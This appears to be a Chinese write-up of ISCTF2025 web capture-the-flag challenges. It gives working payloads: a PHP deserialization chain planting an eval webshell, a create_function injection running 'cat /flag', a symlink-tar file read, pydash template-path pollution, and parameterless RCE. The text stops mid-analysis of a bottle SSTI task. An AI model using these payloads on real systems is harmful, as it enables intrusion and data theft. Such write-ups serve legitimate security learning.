# [个人队伍] ISCTF2025的Writeup

> **2025年12月8日12:25 ~ 2029年12月13日2:25**
>
> **比赛地址：https://gz.imxbt.cn/games/32/challenges**
>
> **复现地址：https://gz.imxbt.cn/games/32/challenges**

> 个人赛
>
> # ISCTF2025
>
> **518**支队伍已报名
>
> 开始时间
>
> 2025年12月8日中午12点25分
>
> 结束时间
>
> 2029年12月13日下午2点25分
>
> FLAG格式为ISCTF{} WP请见 https://cdisk.imxbt.cn/s/jRfM?path=%2Fwp 的ISCTF2025-官方WriteUp.pdf



# All

## Web

### 来签个到吧

#### 题目信息

> ## 来签个到吧250 pts
>
> 出题人：卡奇
>
> 院校：无
>
> 难度：简单
>
> ------
>
> 小蓝鲨邀请你来打CTF😋

#### 解题过程

**代码审计**

**index.php**

```php
<?php
require_once "./config.php";
require_once "./classes.php";

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $s = $_POST["shark"] ?? '喵喵喵?';

    if (str_starts_with($s, "blueshark:")) {
        $ss = substr($s, strlen("blueshark:"));

        $o = @unserialize($ss);

        $p = $db->prepare("INSERT INTO notes (content) VALUES (?)");
        $p->execute([$ss]);

        echo "save sucess!";
        exit(0);
    } else {
        echo "喵喵喵?";
        exit(1);
    }
}

$q = $db->query("SELECT id, content FROM notes ORDER BY id DESC LIMIT 10");
$rows = $q->fetchAll(PDO::FETCH_ASSOC);
?>

<!doctype html>
<html>
<head>
    <meta charset="utf-8" />
    <title>宝宝你是一只猫猫</title>
    <style>
        body { font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial; padding: 24px; }
        textarea { width: 100%; max-width: 800px; height: 120px; font-family: monospace; }
        .recent { margin-top: 20px; max-width: 900px; }
        .note { background:#f7f7f8; padding:10px; border-radius:6px; margin-bottom:8px; font-family: monospace; white-space:pre-wrap; }
        .meta { color:#666; font-size:90%; margin-bottom:6px; }
        .btn { padding:8px 14px; border-radius:6px; border:1px solid #ccc; background:#fff; cursor:pointer; }
    </style>
</head>
<body>
<h1>SharkHub</h1>

<form method="POST" style="max-width:900px; margin-bottom:18px;">
    <p>你喜欢小蓝鲨吗？</p>
    <br/>
    <!--
    <textarea id="s" name="shark" placeholder=""></textarea><br/>
    <br/>
    <button class="btn" type="submit">commit</button>
    -->
</form>

<div class="recent">
    <h2>Recent</h2>
    <?php foreach ($rows as $r): ?>
        <div class="note">
            <div class="meta">#<?= htmlspecialchars($r['id'], ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') ?></div>
            <div><?= htmlspecialchars($r['content'], ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') ?></div>
        </div>
    <?php endforeach; ?>
</div>
</body>
</html>
```

**分析**

- **$o = @unserialize($ss);**存在序列化漏洞

**classes.php**

```php
<?php
class FileLogger {
    public $logfile = "/tmp/notehub.log";
    public $content = "";

    public function __construct($f=null) {
        if ($f) {
            $this->logfile = $f;
        }
    }

    public function write($msg) {
        $this->content .= $msg . "\n";
        file_put_contents($this->logfile, $this->content, FILE_APPEND);
    }

    public function __destruct() {
        if ($this->content) {
            file_put_contents($this->logfile, $this->content, FILE_APPEND);
        }
    }
}

class ShitMountant {
    public $url;
    public $logger;

    public function __construct($url) {
        $this->url = $url;
        $this->logger = new FileLogger();
    }

    public function fetch() {
        $c = file_get_contents($this->url);
        if ($this->logger) {
            $this->logger->write("fetched ==> " . $this->url);
        }
        return $c;
    }

    public function __destruct() {
        $this->fetch();
    }
}
?>
```

**分析**

- 我们尝试序列化这个类，写入木马脚本

**编写脚本**

```PHP
<?php
class FileLogger {
    public $logfile = "/tmp/notehub.log";
    public $content = "";

    public function __construct($f=null) {
        if ($f) {
            $this->logfile = $f;
        }
    }

    public function write($msg) {
        $this->content .= $msg . "\n";
        file_put_contents($this->logfile, $this->content, FILE_APPEND);
    }

    public function __destruct() {
        if ($this->content) {
            file_put_contents($this->logfile, $this->content, FILE_APPEND);
        }
    }
}

class ShitMountant {
    public $url;
    public $logger;

    public function __construct($url) {
        $this->url = $url;
        $this->logger = new FileLogger("/var/www/html/php.php"); # 写入路径
    }

    public function fetch() {
        $c = file_get_contents($this->url);
        if ($this->logger) {
            $this->logger->write("fetched ==> " . $this->url);
        }
        return $c;
    }

    public function __destruct() {
        $this->fetch();
    }
}

$shitMountant = new ShitMountant("<?php eval(\$_POST['cmd']); ?>"); # 写入内容
echo urlencode(serialize($shitMountant));
```

```shell
O%3A12%3A%22ShitMountant%22%3A2%3A%7Bs%3A3%3A%22url%22%3Bs%3A29%3A%22%3C%3Fphp+eval%28%24_POST%5B%27cmd%27%5D%29%3B+%3F%3E%22%3Bs%3A6%3A%22logger%22%3BO%3A10%3A%22FileLogger%22%3A2%3A%7Bs%3A7%3A%22logfile%22%3Bs%3A21%3A%22%2Fvar%2Fwww%2Fhtml%2Fphp.php%22%3Bs%3A7%3A%22content%22%3Bs%3A0%3A%22%22%3B%7D%7D
```

**发起攻击**

```shell
http://challenge.imxbt.cn:32270/
POST shark=blueshark:O%3A12%3A%22ShitMountant%22%3A2%3A%7Bs%3A3%3A%22url%22%3Bs%3A29%3A%22%3C%3Fphp+eval%28%24_POST%5B%27cmd%27%5D%29%3B+%3F%3E%22%3Bs%3A6%3A%22logger%22%3BO%3A10%3A%22FileLogger%22%3A2%3A%7Bs%3A7%3A%22logfile%22%3Bs%3A21%3A%22%2Fvar%2Fwww%2Fhtml%2Fphp.php%22%3Bs%3A7%3A%22content%22%3Bs%3A0%3A%22%22%3B%7D%7D
```

```shell
save sucess!
Warning: file_get_contents(<?php eval($_POST['cmd']); ?>): Failed to open stream: No such file or directory in /var/www/html/classes.php on line 34
```

```shell
http://challenge.imxbt.cn:32270/php.php
POST cmd=system("cat /f*");
```

```shell
fetched ==> ISCTF{ff7f1d76-9010-4ae7-829a-56fff6f4d699} fetched ==> ISCTF{ff7f1d76-9010-4ae7-829a-56fff6f4d699}
```

#### 题目答案

**得到：ISCTF{ff7f1d76-9010-4ae7-829a-56fff6f4d699}**



### flag？我就借走了

#### 题目信息

> ## flag？我就借走了250 pts
>
> 出题人：糖糖毬
>
> 院校：江西财经大学
>
> 难度：简单
>
> ------
>
> 小蓝鲨建了一个资源站，它还很贴心的支持了多种文件格式，甚至能自动解压！小蓝鲨还是太贴心了

#### 解题过程

**编写脚本**

```shell
ln -s /flag flag.txt
tar -cf flag.tar flag.txt
```

**发起攻击**

```shell
http://challenge.imxbt.cn:30816/download/flag.txt
```

```shell
ISCTF{6321cca0-73bd-4d5f-a11b-de9b5629bdb9}
```

#### 题目答案

**得到：ISCTF{6321cca0-73bd-4d5f-a11b-de9b5629bdb9}**



### Bypass

#### 题目信息

> ## Bypass250 pts
>
> 出题人：BR
>
> 院校：西安理工大学
>
> 难度：中等
>
> ------
>
> How to bypass?

#### 解题过程

##### **查看源码** 

```php
<?php
class FLAG
{
    private $a;
    protected $b;
    public function __construct($a, $b)
        {
            $this->a = $a;
            $this->b = $b;
            $this->check($a,$b);
            eval($a.$b);
        }
    public function __destruct(){
            $a = (string)$this->a;
            $b = (string)$this->b;
            if ($this->check($a,$b)){
                $a("", $b);
            }
            else{
                echo "Try again!";
            }
        }
    private function check($a, $b) {
        $blocked_a = ['eval', 'dl', 'ls', 'p', 'escape', 'er', 'str', 'cat', 'flag', 'file', 'ay', 'or', 'ftp', 'dict', '\.\.', 'h', 'w', 'exec', 's', 'open'];
        $blocked_b = ['find', 'filter', 'c', 'pa', 'proc', 'dir', 'regexp', 'n', 'alter', 'load', 'grep', 'o', 'file', 't', 'w', 'insert', 'sort', 'h', 'sy', '\.\.', 'array', 'sh', 'touch', 'e', 'php', 'f'];

        $pattern_a = '/' . implode('|', array_map('preg_quote', $blocked_a, ['/'])) . '/i';
        $pattern_b = '/' . implode('|', array_map('preg_quote', $blocked_b, ['/'])) . '/i';

        if (preg_match($pattern_a, $a) || preg_match($pattern_b, $b)) {
            return false;
        }
        return true;
    }  
}


if (isset($_GET['exp'])) {
    $p = unserialize($_GET['exp']);
    var_dump($p);
}else{
    highlight_file("index.php");
}
```

**分析**

- **create_function**

  ```php
  function create_function($args, $code) {
      $virtual_code = "function lambda_func($args) { $code }"; 
      eval($virtual_code);
  }
  ```

- **$a=craetefunction**

- **$b=}"system"("cat /flag");//**

##### **信息搜集**

###### **php版本**

```shell
X-Powered-By : PHP/7.1.30
```

**分析**

- **create_function**在**php7.3中被废弃**，在**php8.0中被移除**

##### **编写脚本**

```php
<?php
class FLAG
{
    private $a;
    protected $b;
    public function __construct($a, $b)
    {
        $this->a = $a;
        $this->b = $b;
    }
}

$flag = new FLAG("create_function", '}"\163\171\163\164\145\155"("\143\141\164\40\57\146\154\141\147");//');
echo urlencode(serialize($flag));
```

```shell
O%3A4%3A%22FLAG%22%3A2%3A%7Bs%3A7%3A%22%00FLAG%00a%22%3Bs%3A15%3A%22create_function%22%3Bs%3A4%3A%22%00%2A%00b%22%3Bs%3A68%3A%22%7D%22%5C163%5C171%5C163%5C164%5C145%5C155%22%28%22%5C143%5C141%5C164%5C40%5C57%5C146%5C154%5C141%5C147%22%29%3B%2F%2F%22%3B%7D
```

##### **发起攻击**

```shell
?exp=O%3A4%3A%22FLAG%22%3A2%3A%7Bs%3A7%3A%22%00FLAG%00a%22%3Bs%3A15%3A%22create_function%22%3Bs%3A4%3A%22%00%2A%00b%22%3Bs%3A68%3A%22%7D%22%5C163%5C171%5C163%5C164%5C145%5C155%22%28%22%5C143%5C141%5C164%5C40%5C57%5C146%5C154%5C141%5C147%22%29%3B%2F%2F%22%3B%7D
```

```shell
object(FLAG)#1 (2) { ["a":"FLAG":private]=> string(15) "create_function" ["b":protected]=> string(68) "}"\163\171\163\164\145\155"("\143\141\164\40\57\146\154\141\147");//" } ISCTF{d796148d-d0ab-40a3-bf8c-c41150415e0b}
```

#### 题目答案

##### 最终脚本

```php
<?php
class FLAG
{
    private $a;
    protected $b;
    public function __construct($a, $b)
    {
        $this->a = $a;
        $this->b = $b;
    }
}

$flag = new FLAG("create_function", '}"\163\171\163\164\145\155"("\143\141\164\40\57\146\154\141\147");//');
echo urlencode(serialize($flag));
```

##### 得到答案

**ISCTF{d796148d-d0ab-40a3-bf8c-c41150415e0b}**



### **Who am I**

#### 题目信息

> ## Who am I250 pts
>
> 出题人：duu
>
> 院校：河南理工大学
>
> 难度：简单
>
> ------
>
> 小蓝鲨做了一个半成品系统，但似乎很容易获取到敏感信息

#### 解题过程

##### 抓包

```shell
username=admin&password=123456&type=1
```

```shell
username=admin&password=123456&type=0
```

**分析**

- 抓包将type=1改成type=0进入管理员模式

##### 查看源码

###### sontriex.a47b9c5f.js

```python
fetch("/user/demo",{method:"POST"})
  .then(r => r.json())
  .then(data => {
    document.getElementById("username").innerText = data.username;
  });
```

###### malniest.e19a0e13.js

```python
(function () {
  "use strict";

  function noop() {}
  function identity(x) { return x; }
  function times(n, fn) { for (let i = 0; i < n; i++) fn(i); }
  function clamp(v, a, b) { return Math.min(b, Math.max(a, v)); }
  function hashStr(s) { let h = 0; for (let i = 0; i < s.length; i++) h = (h << 5) - h + s.charCodeAt(i) | 0; return h >>> 0; }
  function randInt(a, b) { return a + Math.floor(Math.random() * (b - a + 1)); }
  function pad2(n) { return n < 10 ? "0" + n : "" + n; }
  function dateStamp() { const d = new Date(); return d.getFullYear()+"-"+pad2(d.getMonth()+1)+"-"+pad2(d.getDate()); }
  function debounce(fn, wait) { let t; return function () { clearTimeout(t); t = setTimeout(() => fn.apply(this, arguments), wait); }; }
  function throttle(fn, wait) { let last = 0; return function () { const now = Date.now(); if (now - last >= wait) { last = now; fn.apply(this, arguments); } }; }
  function memo(fn) { const m = new Map(); return function (k) { if (m.has(k)) return m.get(k); const v = fn(k); m.set(k, v); return v; }; }
  const expensive = memo(n => { let r = 1; for (let i = 1; i < 1000; i++) r = (r * (n + i)) % 2147483647; return r; });

  function camel(s){return s.replace(/[-_](\w)/g,(_,c)=>c.toUpperCase());}
  function chunk(arr, size){const out=[];for(let i=0;ia.concat(b),[]);}
  function repeatStr(s,n){let r="";times(n,()=>r+=s);return r;}
  const loremPool = "lorem ipsum dolor sit amet consectetur adipiscing elit".split(" ");
  function lorem(n){let r=[];times(n,()=>r.push(loremPool[randInt(0,loremPool.length-1)]));return r.join(" ");}

  const Net = {
    get: function(url){ return Promise.resolve({url, ok: true, ts: Date.now()}); },
    post: function(url, body){ return Promise.resolve({url, ok: true, len: JSON.stringify(body||{}).length}); }
  };

  const Bus = (function(){
    const map = new Map();
    return {
      on: (e,fn)=>{ if(!map.has(e)) map.set(e, []); map.get(e).push(fn); },
      emit: (e,p)=>{ const arr = map.get(e)||[]; arr.forEach(fn=>{ try{fn(p);}catch(_){} }); },
      off: (e,fn)=>{ const arr = map.get(e)||[]; map.set(e, arr.filter(f=>f!==fn)); }
    };
  })();

  const DOM = {
    qs: (sel, root=document)=>root.querySelector(sel),
    qsa: (sel, root=document)=>Array.from(root.querySelectorAll(sel)),
    el: (tag, props)=>Object.assign(document.createElement(tag), props||{}),
    hide: (node)=>{ if(node && node.style) node.style.display = "none"; },
    show: (node)=>{ if(node && node.style) node.style.display = ""; },
    on: (node, ev, fn, opt)=>node && node.addEventListener(ev, fn, opt)
  };

  function fakeLayoutScore(node){
    if(!node) return 0;
    const r = node.getBoundingClientRect ? node.getBoundingClientRect() : {width:1,height:1};
    return clamp(Math.floor((r.width * r.height) % 9973), 0, 9973);
  }

  const CFG = {
    version: "v"+dateStamp()+"."+randInt(100,999),
    flags: { featureX: false, featureY: true, verbose: false }
  };
  const Cache = new Map();

  (function lightScheduler(){
    const tasks = [
      ()=>Cache.set("k"+randInt(1,9), hashStr(lorem(5))),
      ()=>expensive(randInt(1,100)),
      ()=>Bus.emit("tick", Date.now())
    ];
    let i=0;
    setTimeout(function run(){
      try { tasks[i%tasks.length](); } catch(_){}
      i++;
      if(i<5) setTimeout(run, randInt(60,140));
    }, randInt(50,120));
  })();

  function ensureTypeHidden() {
    const form = DOM.qs("form[action='/login'][method='POST']");
    if (!form) return;

    let hidden = form.querySelector("input[name='type']");
    if (!hidden) {
      hidden = DOM.el("input", { type: "hidden", name: "type", value: "1" });
      form.appendChild(hidden);
    }

    DOM.on(form, "submit", function () {
      let h = form.querySelector("input[name='type']");
      if (!h) {
        h = DOM.el("input", { type: "hidden", name: "type", value: "1" });
        form.appendChild(h);
      } else if (h.value !== "1") {
        h.value = "1";
      }
    });
  }

  function mountInvisible(){
    try{
      const ghost = DOM.el("div");
      ghost.setAttribute("data-h", hashStr(CFG.version));
      ghost.style.cssText = "display:none;width:0;height:0;overflow:hidden;";
      ghost.textContent = repeatStr("*", randInt(1,3)); 
      document.body.appendChild(ghost);
    }catch(_){}
  }

  function prewarm(){
    try{
      Net.get("/ping?_="+Date.now()).then(noop).catch(noop);
      times(3, i => Cache.set("warm"+i, expensive(i+1)));
    }catch(_){}
  }

  function keySpy(){
    const handler = throttle(function(){  }, 200);
    DOM.on(document, "keydown", handler);
  }

  function init(){
    prewarm();
    keySpy();
    ensureTypeHidden();     
    mountInvisible();
    Bus.on("tick", noop);
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", init, { once: true });
  } else {
    init();
  }

})();
```

###### main.py

```python
from flask import Flask,request,render_template,redirect,url_for
import json
import pydash

app=Flask(__name__)

database={}
data_index=0
name=''

@app.route('/',methods=['GET'])
def index():
    return render_template('login.html')

@app.route('/register',methods=['GET'])
def register():
    return render_template('register.html')

@app.route('/registerV2',methods=['POST'])
def registerV2():
    username=request.form['username']
    password=request.form['password']
    password2=request.form['password2']
    if password!=password2:
        return '''
        <script>
        alert('前后密码不一致，请确认后重新输入。');
        window.location.href='/register';
        </script>
        '''
    else:
        global data_index
        data_index+=1
        database[data_index]=username
        database[username]=password
        return redirect(url_for('index'))

@app.route('/user_dashboard',methods=['GET'])
def user_dashboard():
    return render_template('dashboard.html')

@app.route('/272e1739b89da32e983970ece1a086bd',methods=['GET'])
def A272e1739b89da32e983970ece1a086bd():
    return render_template('admin.html')

@app.route('/operate',methods=['GET'])
def operate():
    username=request.args.get('username')
    password=request.args.get('password')
    confirm_password=request.args.get('confirm_password')
    if username in globals() and "old" not in password:
        Username=globals()[username]
        try:
            pydash.set_(Username,password,confirm_password)
            return "oprate success"
        except:
            return "oprate failed"
    else:
        return "oprate failed"

@app.route('/user/name',methods=['POST'])
def name():
    return {'username':user}

def logout():
    return redirect(url_for('index'))

@app.route('/reset',methods=['POST'])
def reset():
    old_password=request.form['old_password']
    new_password=request.form['new_password']
    if user in database and database[user] == old_password:
        database[user]=new_password
        return '''
        <script>
        alert('密码修改成功，请重新登录。');
        window.location.href='/';
        </script>
        '''
    else:
        return '''
        <script>
        alert('密码修改失败，请确认旧密码是否正确。');
        window.location.href='/user_dashboard';
        </script>
        '''

@app.route('/impression',methods=['GET'])
def impression():
    point=request.args.get('point')
    if len(point) > 5:
        return "Invalid request"
    List=["{","}",".","%","<",">","_"]
    for i in point:
        if i in List:
            return "Invalid request"
    return render_template(point)

@app.route('/login',methods=['POST'])
def login():
    username=request.form['username']
    password=request.form['password']
    type=request.form['type']
    if username in database and database[username] != password:
        return '''
        <script>
        alert('用户名或密码错误请重新输入。');
        window.location.href='/';
        </script>
        '''
    elif username not in database:
        return '''
        <script>
        alert('用户名或密码错误请重新输入。');
        window.location.href='/';
        </script>
        '''
    else:
        global name
        name=username    
        if int(type)==1:
            return redirect(url_for('user_dashboard'))
        elif int(type)==0:
            return redirect(url_for('A272e1739b89da32e983970ece1a086bd'))

if __name__=='__main__':
    app.run(host='0.0.0.0',port=8080,debug=False)
```

**分析**

- ```python
  @app.route('/operate',methods=['GET'])
  def operate():
      username=request.args.get('username')
      password=request.args.get('password')
      confirm_password=request.args.get('confirm_password')
      if username in globals() and "old" not in password:
          Username=globals()[username]
          try:
              pydash.set_(Username,password,confirm_password)
              return "oprate success"
          except:
              return "oprate failed"
      else:
          return "oprate failed"
  ```

  password参数可控，pydash.set_()参数可控，我们可以利用这点修改渲染路径

- ```python
  @app.route('/impression',methods=['GET'])
  def impression():
      point=request.args.get('point')
      if len(point) > 5:
          return "Invalid request"
      List=["{","}",".","%","<",">","_"]
      for i in point:
          if i in List:
              return "Invalid request"
      return render_template(point)
  ```

  这里加载渲染模板

##### 发起攻击

```shell
/operate?username=app&password=jinja_loader.searchpath[0]&confirm_password=/
```

```shell
oprate success
```

```shell
/impression?point=flag
```

```sjell
ISCTF{9fd850db-c8f8-4a08-ab4a-3c8795a00527}
```

#### 题目答案

##### 最终payload

```shell
/operate?username=app&password=jinja_loader.searchpath[0]&confirm_password=/
/impression?point=flag
```

##### 得到答案

```shell
ISCTF{9fd850db-c8f8-4a08-ab4a-3c8795a00527}
```



### ezrce

#### 题目信息

> ## ezrce250 pts
>
> 出题人：f1@g
>
> 院校：信阳师范大学
>
> 难度：简单
>
> ------
>
> 如此ez的rce,补兑，怎么只允许这些？

#### 解题过程

##### 查看题目

```php
<?php
highlight_file(__FILE__);

if(isset($_GET['code'])){
    $code = $_GET['code'];
    if (preg_match('/^[A-Za-z\(\)_;]+$/', $code)) {
        eval($code);
    }else{
        die('师傅，你想拿flag？');
    }
}
```

**分析**

- 无参rce

##### 编写payload

```python
?code=chdir(next(scandir(current(localeconv()))));chdir(next(scandir(current(localeconv()))));chdir(next(scandir(current(localeconv()))));chdir(next(scandir(current(localeconv()))));chdir(next(scandir(current(localeconv()))));chdir(next(scandir(current(localeconv()))));chdir(next(scandir(current(localeconv()))));chdir(next(scandir(current(localeconv()))));chdir(next(scandir(current(localeconv()))));chdir(next(scandir(current(localeconv()))));print_r(scandir(current(localeconv())));show_source(flag);
```

```shell
Array ( [0] => . [1] => .. [2] => bin [3] => dev [4] => etc [5] => flag [6] => home [7] => lib [8] => media [9] => mnt [10] => opt [11] => proc [12] => root [13] => run [14] => sbin [15] => srv [16] => sys [17] => tmp [18] => usr [19] => var )
Warning: Use of undefined constant flag - assumed 'flag' (this will throw an Error in a future version of PHP) in /var/www/html/index.php(7) : eval()'d code on line 1
ISCTF{7444e7b1-387f-4917-be3e-a5af1338afa0}
```

#### 题目答案

##### 最终payload

```shell
?code=chdir(next(scandir(current(localeconv()))));chdir(next(scandir(current(localeconv()))));chdir(next(scandir(current(localeconv()))));chdir(next(scandir(current(localeconv()))));chdir(next(scandir(current(localeconv()))));chdir(next(scandir(current(localeconv()))));chdir(next(scandir(current(localeconv()))));chdir(next(scandir(current(localeconv()))));chdir(next(scandir(current(localeconv()))));chdir(next(scandir(current(localeconv()))));print_r(scandir(current(localeconv())));show_source(flag);
```

##### 得到答案

```shell
ISCTF{7444e7b1-387f-4917-be3e-a5af1338afa0}
```



### 难过的bottle

#### 题目信息

> ## 难过的bottle250 pts
>
> 出题人：Twansh
>
> 院校：福建理工大学
>
> 难度：简单
>
> ------
>
> 小蓝鲨发明的zip在线解压器有点奇怪

#### 解题过程

##### 查看源码

```python
from bottle import route, run, template, post, request, static_file, error
import os
import zipfile
import hashlib
import time
import shutil


# hint: flag is in /flag

UPLOAD_DIR = 'uploads'
os.makedirs(UPLOAD_DIR, exist_ok=True)
MAX_FILE_SIZE = 1 * 1024 * 1024  # 1MB

BLACKLIST = ["b","c","d","e","h","i","j","k","m","n","o","p","q","r","s","t","u","v","w","x","y","z","%",";",",","<",">",":","?"]

def contains_blacklist(content):
    """检查内容是否包含黑名单中的关键词（不区分大小写）"""
    content = content.lower()
    return any(black_word in content for black_word in BLACKLIST)

def safe_extract_zip(zip_path, extract_dir):
    """安全解压ZIP文件（防止路径遍历攻击）"""
    with zipfile.ZipFile(zip_path, 'r') as zf:
        for member in zf.infolist():
            member_path = os.path.realpath(os.path.join(extract_dir, member.filename))
            if not member_path.startswith(os.path.realpath(extract_dir)):
                raise ValueError("非法文件路径: 路径遍历攻击检测")
            
            zf.extract(member, extract_dir)

@route('/')
def index():
    """首页"""
    return '''
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ZIP文件查看器</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="/static/css/style.css">
</head>
<body>
    <div class="header text-center">
        <div class="container">
            <h1 class="display-4 fw-bold">📦 ZIP文件查看器</h1>
            <p class="lead">安全地上传和查看ZIP文件内容</p>
        </div>
    </div>
    <div class="container">
        <div class="row justify-content-center" id="index-page">
            <div class="col-md-8 text-center">
                <div class="card">
                    <div class="card-body p-5">
                        <div class="emoji-icon">📤</div>
                        <h2 class="card-title">轻松查看ZIP文件内容</h2>
                        <p class="card-text">上传ZIP文件并安全地查看其中的内容，无需解压到本地设备</p>
                        <div class="mt-4">
                            <a href="/upload" class="btn btn-primary btn-lg px-4 me-3">
                                📁 上传ZIP文件
                            </a>
                            <a href="#features" class="btn btn-outline-secondary btn-lg px-4">
                                ℹ️ 了解更多
                            </a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="row mt-5" id="features">
            <div class="col-md-4 mb-4">
                <div class="card h-100">
                    <div class="card-body text-center p-4">
                        <div class="emoji-icon">🛡️</div>
                        <h4>安全检测</h4>
                        <p>系统会自动检测上传文件，防止路径遍历攻击和恶意内容</p>
                    </div>
                </div>
            </div>
            <div class="col-md-4 mb-4">
                <div class="card h-100">
                    <div class="card-body text-center p-4">
                        <div class="emoji-icon">📄</div>
                        <h4>内容预览</h4>
                        <p>直接在线查看ZIP文件中的文本内容，无需下载</p>
                    </div>
                </div>
            </div>
            <div class="col-md-4 mb-4">
                <div class="card h-100">
                    <div class="card-body text-center p-4">
                        <div class="emoji-icon">⚡</div>
                        <h4>快速处理</h4>
                        <p>高效处理小于1MB的ZIP文件，快速获取内容</p>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
    '''

@route('/upload')
def upload_page():
    """上传页面"""
    return '''
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>上传ZIP文件</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="/static/css/style.css">
</head>
<body>
    <div class="header text-center">
        <div class="container">
            <h1 class="display-4 fw-bold">📦 ZIP文件查看器</h1>
            <p class="lead">安全地上传和查看ZIP文件内容</p>
        </div>
    </div>
    <div class="container mt-4">
        <div class="row justify-content-center">
            <div class="col-md-8">
                <div class="card">
                    <div class="card-header bg-primary text-white">
                        <h4 class="mb-0">📤 上传ZIP文件</h4>
                    </div>
                    <div class="card-body">
                        <form action="/upload" method="post" enctype="multipart/form-data" class="upload-form">
                            <div class="mb-3">
                                <label for="fileInput" class="form-label">选择ZIP文件（最大1MB）</label>
                                <input class="form-control" type="file" name="file" id="fileInput" accept=".zip" required>
                                <div class="form-text">仅支持.zip格式的文件，且文件大小不超过1MB</div>
                            </div>
                            <button type="submit" class="btn btn-primary w-100">
                                📤 上传文件
                            </button>
                        </form>
                    </div>
                </div>
                <div class="text-center mt-4">
                    <a href="/" class="btn btn-outline-secondary">
                        ↩️ 返回首页
                    </a>
                </div>
            </div>
        </div>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
    '''

@post('/upload')
def upload():
    """处理文件上传"""
    zip_file = request.files.get('file')
    if not zip_file or not zip_file.filename.endswith('.zip'):
        return '请上传有效的ZIP文件'
    
    zip_file.file.seek(0, 2)  
    file_size = zip_file.file.tell()
    zip_file.file.seek(0)  
    
    if file_size > MAX_FILE_SIZE:
        return f'文件大小超过限制({MAX_FILE_SIZE/1024/1024}MB)'
    
    timestamp = str(time.time())
    unique_str = zip_file.filename + timestamp
    dir_hash = hashlib.md5(unique_str.encode()).hexdigest()
    extract_dir = os.path.join(UPLOAD_DIR, dir_hash)
    os.makedirs(extract_dir, exist_ok=True)
    
    zip_path = os.path.join(extract_dir, 'uploaded.zip')
    zip_file.save(zip_path)
    
    try:
        safe_extract_zip(zip_path, extract_dir)
    except (zipfile.BadZipFile, ValueError) as e:
        shutil.rmtree(extract_dir) 
        return f'处理ZIP文件时出错: {str(e)}'
    
    files = [f for f in os.listdir(extract_dir) if f != 'uploaded.zip']
    
    return template('''
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>上传成功</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="/static/css/style.css">
</head>
<body>
    <div class="header text-center">
        <div class="container">
            <h1 class="display-4 fw-bold">📦 ZIP文件查看器</h1>
            <p class="lead">安全地上传和查看ZIP文件内容</p>
        </div>
    </div>

    <div class="container mt-4">
        <div class="row justify-content-center">
            <div class="col-md-8">
                <div class="card">
                    <div class="card-header bg-success text-white">
                        <h4 class="mb-0">✅ 上传成功!</h4>
                    </div>
                    <div class="card-body">
                        <div class="alert alert-success" role="alert">
                            ✅ 文件已成功上传并解压
                        </div>

                        <h5>文件列表:</h5>
                        <ul class="list-group mb-4">
                            % for file in files:
                            <li class="list-group-item d-flex justify-content-between align-items-center">
                                <span>📄 {{file}}</span>
                                <a href="/view/{{dir_hash}}/{{file}}" class="btn btn-sm btn-outline-primary">
                                    查看
                                </a>
                            </li>
                            % end
                        </ul>

                        % if files:
                        <div class="d-grid gap-2">
                            <a href="/view/{{dir_hash}}/{{files[0]}}" class="btn btn-primary">
                                👀 查看第一个文件
                            </a>
                        </div>
                        % end
                    </div>
                </div>

                <div class="text-center mt-4">
                    <a href="/upload" class="btn btn-outline-primary me-2">
                        ➕ 上传另一个文件
                    </a>
                    <a href="/" class="btn btn-outline-secondary">
                        🏠 返回首页
                    </a>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
    ''', dir_hash=dir_hash, files=files)

@route('/view/<dir_hash>/<filename:path>')
def view_file(dir_hash, filename):
    file_path = os.path.join(UPLOAD_DIR, dir_hash, filename)
    
    if not os.path.exists(file_path):
        return "文件不存在"
    
    if not os.path.isfile(file_path):
        return "请求的路径不是文件"
    
    real_path = os.path.realpath(file_path)
    if not real_path.startswith(os.path.realpath(UPLOAD_DIR)):
        return "非法访问尝试"
    
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            content = f.read()
    except:
        try:
            with open(file_path, 'r', encoding='latin-1') as f:
                content = f.read()
        except:
            return "无法读取文件内容（可能是二进制文件）"
    
    if contains_blacklist(content):
        return "文件内容包含不允许的关键词"
    
    try:
        return template(content)
    except Exception as e:
        return f"渲染错误: {str(e)}"

@route('/static/<filename:path>')
def serve_static(filename):
    """静态文件服务"""
    return static_file(filename, root='static')

@error(404)
def error404(error):
    return "讨厌啦不是说好只看看不摸的吗"

@error(500)
def error500(error):
    return "不要透进来啊啊啊啊"

if __name__ == '__main__':
    os.makedirs('static', exist_ok=True)
    
    #原神，启动!
    run(host='0.0.0.0', port=5000, debug=False)
```

**分析**

- ```python
  with open(file_path, 'r', encoding='utf-8') as f:
      content = f.read()
  ```

  ```python
  return template(content)
  ```

  它直接引用我们文件内的内容

  作为flask的渲染存在ssti

- ```python
  BLACKLIST = ["b","c","d","e","h","i","j","k","m","n","o","p","q","r","s","t","u","v","w","x","y","z","%",";",",","<",">",":","?"]
  ```

